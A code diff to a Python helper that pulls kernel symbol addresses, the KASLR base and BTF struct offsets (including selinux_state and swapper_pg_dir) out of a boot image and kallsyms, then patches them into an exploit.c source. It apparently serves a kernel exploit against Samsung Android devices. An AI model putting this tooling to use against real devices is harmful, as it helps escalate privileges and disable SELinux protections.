@@ -8,7 +8,7 @@ arg = sys.argv[1:]
 boot     = arg[0] if len(arg) > 0 else "boot.img"
 kallsyms = arg[1] if len(arg) > 1 else "kallsyms.txt"
 init     = arg[2] if len(arg) > 2 else "init"
-exploit  = arg[3] if len(arg) > 3 else str(Path(__file__).resolve().parent.parent / "src/exploit.c")
+exploit  = arg[3] if len(arg) > 3 else str(Path(__file__).resolve().parent / "exploit.c")
 
 defines = {}
 
@@ -24,10 +24,11 @@ for line in Path(kallsyms).read_text(errors="replace").splitlines():
         sym[col[2]] = int(col[0], 16)
 
 # KASLR symbols + signature (first 6 words of _stext)
-stext = sym["_stext"]
+# Some kallsyms extractors drop the address on _stext/_text; fall back to _text+0x10000,
+# else the lowest symbol address (== kernel text start == _stext).
+stext = sym.get("_stext") or (sym["_text"] + 0x10000 if "_text" in sym else min(sym.values()))
 base  = sym.get("_text", stext - 0x10000)        # _text is the kernel base; 0x10000 is the usual gap
 words = list(struct.unpack_from("<6I", kernel, stext - base))
-sig   = struct.unpack_from("<2Q", kernel, stext - base)
 defines.update({
     "FW_STEXT_VA":             f"0x{stext:x}ULL",
     "FW_SWAPPER_PG_DIR_VA":    f"0x{sym['swapper_pg_dir']:x}ULL",
@@ -35,9 +36,8 @@ defines.update({
     "FW_SELINUX_STATE_VA":     f"0x{sym['selinux_state']:x}ULL",
     "SAMSUNG_LINEAR_MAP_BASE": f"0x{base:x}ULL",
     "SAMSUNG_STEXT_OFFSET":    f"0x{stext - base:x}",
-    "FW_STEXT_SIG1":           f"0x{sig[0]:016x}ULL",
-    "FW_STEXT_SIG2":           f"0x{sig[1]:016x}ULL",
 })
+# FW_STEXT_SIG1/SIG2 are derived in-code from FW_STEXT_WORDS (patched below).
 
 # struct offsets from the kernel's embedded BTF
 btf = kernel.find(b"\x9f\xeb\x01\x00")
@@ -98,10 +98,13 @@ for name, value in defines.items():
     if n != 1:
         sys.exit(f"{name}: patched {n} sites, expected 1")
 rows = ",\n        ".join(", ".join(f"0x{x:08x}" for x in words[i:i + 3]) for i in (0, 3))
-src = re.sub(r"(expected_words\[6\] = \{).*?(\};)", lambda m: f"{m[1]}\n        {rows},\n    {m[2]}", src, flags=re.S)
+src, n = re.subn(r"(FW_STEXT_WORDS\[6\] = \{).*?(\};)",
+                 lambda m: f"{m[1]}\n        {rows},\n    {m[2]}", src, flags=re.S)
+if n != 1:
+    sys.exit(f"FW_STEXT_WORDS: patched {n} sites, expected 1")
 Path(exploit).write_text(src)
 
 report = "\n".join(f"#define {k:28} {v}" for k, v in defines.items())
-report += "\nexpected_words[6] = " + ", ".join(f"0x{x:08x}" for x in words)
+report += "\nFW_STEXT_WORDS[6] = " + ", ".join(f"0x{x:08x}" for x in words)
 Path("offsets.txt").write_text(report + "\n")
 print(report + f"\n\npatched {exploit}, wrote offsets.txt")
